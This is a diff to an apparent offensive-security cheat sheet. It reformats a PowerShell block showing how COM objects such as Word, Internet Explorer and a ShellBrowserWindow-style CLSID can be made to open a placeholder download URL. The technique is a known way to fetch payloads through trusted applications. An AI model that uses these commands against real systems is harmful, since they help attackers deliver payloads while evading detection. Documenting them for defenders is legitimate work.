@@ -66,8 +66,7 @@ Open a URL link from various application
 
 ```powershell
 PS> [activator]::CreateInstance([type]::GetTypeFromProgID("Word.Document", "127.0.0.1")).FollowHyperlink("https://XXX/download")
-PS> 
-[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "127.0.0.1")).Document.application.Open("https://XXX/download")
+PS> [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "127.0.0.1")).Document.application.Open("https://XXX/download")
 PS> [activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.Application","127.0.0.1")).Navigate("https://XXX/download")
 ```
 
